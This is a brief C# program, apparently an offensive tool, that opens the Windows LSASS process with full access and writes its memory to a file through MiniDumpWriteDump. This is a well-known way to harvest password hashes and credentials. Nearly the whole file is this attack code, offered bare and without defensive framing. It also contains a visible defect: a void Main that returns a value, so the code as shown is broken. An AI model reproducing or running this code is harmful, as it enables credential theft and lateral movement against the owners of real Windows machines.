using System;
using System.Diagnostics;
using System.Runtime.InteropServices; using System.IO;

namespace MiniDump {

    class Program {

        [DllImport("Dbghelp.dll")]
            static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        [DllImport("kernel32.dll")]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        static void Main(string[] args) {
            if (args.Length == 0)
            {
                System.Console.WriteLine("Provide dump file path");
                return 1;
            }            
            FileStream dumpFile = new FileStream(args[0], FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }

    }

}